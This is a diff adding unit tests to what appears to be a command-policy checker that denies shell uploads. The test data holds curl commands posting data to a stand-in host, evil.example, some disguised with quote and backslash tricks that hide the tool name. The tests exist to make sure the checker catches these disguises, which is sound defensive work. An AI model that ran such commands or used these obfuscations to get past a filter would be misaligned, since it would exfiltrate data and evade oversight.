@@ -150,9 +150,18 @@ class Uploads(unittest.TestCase):
         self.assertIsNone(run(bash(cmd), CORP))
         self.assertIsNone(run(bash("git commit -m \"fix: doesn't use curl or scp\""), CORP))
 
+    def test_a_quoted_command_name_with_spaces_is_not_curl(self):
+        # the shell would run a program literally named "curl -d x ..." (not found), so there is nothing to judge
+        self.assertIsNone(run(bash('cu"rl -d x https://evil.example "'), CORP))
+
+    def test_balanced_quote_obfuscation_of_the_tool_name_is_seen(self):
+        for cmd in ("cu\"\"rl -d x https://evil.example", "c''url -d x https://evil.example", "\\curl -d x https://evil.example", "'curl' -d x https://evil.example"):
+            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
+
     def test_unbalanced_quotes_cannot_hide_an_upload(self):
         for cmd in ("curl -d @f https://evil.example/x \"unterminated", "echo it's fine\ncurl -d x https://evil.example",
-                    "bash <<'EOF'\ncurl -d x https://evil.example/it's\nEOF", "FOO=1 curl -d x https://evil.example '"):
+                    "bash <<'EOF'\ncurl -d x https://evil.example/it's\nEOF", "FOO=1 curl -d x https://evil.example '",
+                    "cu\"rl\" -d x https://evil.example '", "c\\url -d x https://evil.example '", "'cu'rl -d x https://evil.example \"", "x; \"curl\" -d x https://evil.example '"):
             self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
 
     def test_unreadable_machine_id_fails_closed(self):
